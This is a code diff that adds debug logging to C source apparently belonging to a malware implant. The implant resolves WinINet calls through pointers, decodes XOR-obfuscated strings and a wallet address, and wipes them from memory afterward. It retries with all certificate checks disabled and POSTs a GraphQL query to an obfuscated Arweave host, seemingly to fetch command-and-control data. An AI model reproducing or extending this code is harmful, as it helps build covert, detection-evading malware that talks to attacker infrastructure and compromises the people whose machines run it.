@@ -161,35 +161,49 @@ static PBYTE ArwDoRequest(
     DWORD  dwBodyLen,
     PDWORD pdwRespLen
 ) {
+    LOG("[*] ArwDo: InternetOpenA...");
     BYTE xUA[] = XSTR_USER_AGENT; DEOBF(xUA);
     PVOID hNet = pOpen((LPCSTR)xUA, 0, NULL, NULL, 0);
     MemSet(xUA, 0, sizeof(xUA));
+    LOG_HEX("[*] ArwDo: hNet=", (DWORD)(ULONG_PTR)hNet);
     if (!hNet) return NULL;
 
+    LOG("[*] ArwDo: InternetConnectA...");
     PVOID hConn = pConnect(hNet, szHost, 443, NULL, NULL, ARW_INET_SVC_HTTP, 0, 0);
+    LOG_HEX("[*] ArwDo: hConn=", (DWORD)(ULONG_PTR)hConn);
     if (!hConn) { pClose(hNet); return NULL; }
 
     DWORD dwFlags = ARW_INET_FLAG_SECURE  | ARW_INET_FLAG_RELOAD  |
                     ARW_INET_FLAG_NO_CACHE | ARW_INET_FLAG_KEEP_CON |
                     ARW_INET_FLAG_IGN_CN   | ARW_INET_FLAG_IGN_DT;
 
+    LOG("[*] ArwDo: HttpOpenRequestA...");
     PVOID hReq = pHttpOpen(hConn, szMethod, szPath, NULL, NULL, NULL, dwFlags, 0);
+    LOG_HEX("[*] ArwDo: hReq=", (DWORD)(ULONG_PTR)hReq);
     if (!hReq) { pClose(hConn); pClose(hNet); return NULL; }
 
     // dwHeadersLength = -1 means null-terminated; 0 means no headers.
     DWORD dwHdrLen = szHeader ? (DWORD)-1 : 0;
+    LOG("[*] ArwDo: HttpSendRequestA...");
     BOOL bSent = pHttpSend(hReq, szHeader, dwHdrLen, (PVOID)szBody, dwBodyLen);
+    LOG_HEX("[*] ArwDo: bSent=", (DWORD)bSent);
 
     if (!bSent && pSetOpt) {
+        LOG("[*] ArwDo: retrying with cert bypass...");
         DWORD secFlags = 0, secLen = sizeof(secFlags);
         if (pQueryOpt) pQueryOpt(hReq, ARW_INET_OPT_SEC_FLAGS, &secFlags, &secLen);
         secFlags |= ARW_SEC_IGN_CA | ARW_SEC_IGN_CN | ARW_SEC_IGN_DATE | ARW_SEC_IGN_REVOC;
         pSetOpt(hReq, ARW_INET_OPT_SEC_FLAGS, &secFlags, sizeof(secFlags));
         bSent = pHttpSend(hReq, szHeader, dwHdrLen, (PVOID)szBody, dwBodyLen);
+        LOG_HEX("[*] ArwDo: bSent2=", (DWORD)bSent);
     }
 
     PBYTE pResp = NULL;
-    if (bSent) pResp = ArwReadResponse(pRead, hReq, pdwRespLen);
+    if (bSent) {
+        LOG("[*] ArwDo: reading response...");
+        pResp = ArwReadResponse(pRead, hReq, pdwRespLen);
+        LOG_HEX("[*] ArwDo: respLen=", pdwRespLen ? *pdwRespLen : 0);
+    }
 
     pClose(hReq);
     pClose(hConn);
@@ -339,8 +353,11 @@ BOOL FetchArweaveMeta(
     MemSet(xA5, 0, sizeof(xA5)); MemSet(xA6, 0, sizeof(xA6));
     MemSet(xA7, 0, sizeof(xA7)); MemSet(xA8, 0, sizeof(xA8));
 
-    if (!pOpen || !pConnect || !pHttpOpen || !pHttpSend || !pRead || !pClose)
+    if (!pOpen || !pConnect || !pHttpOpen || !pHttpSend || !pRead || !pClose) {
+        LOG("[!] Arweave: WinINet func(s) not resolved");
         return FALSE;
+    }
+    LOG("[*] Arweave: WinINet funcs OK, decoding wallet...");
 
     // ---- Decode wallet address ----
     // INIT_ARWEAVE_WALLET is a XOR-obfuscated byte array (single-byte key).
@@ -426,12 +443,14 @@ BOOL FetchArweaveMeta(
         }
 
         DWORD dwGqlLen = 0;
+        LOG("[*] Arweave: entering ArwDoRequest for GraphQL POST");
         PBYTE pGqlResp = ArwDoRequest(
             pOpen, pConnect, pHttpOpen, pHttpSend, pRead, pClose, pSetOpt, pQueryOpt,
             (LPCSTR)xHost, (LPCSTR)xPost, (LPCSTR)xGqlPath,
             szCtHdr, szGqlBody, (DWORD)StrLenA(szGqlBody), &dwGqlLen
         );
         MemSet(szGqlBody, 0, sizeof(szGqlBody));
+        LOG("[*] Arweave: ArwDoRequest returned");
 
         if (!pGqlResp) {
             LOG("[!] Arweave: GraphQL POST failed");
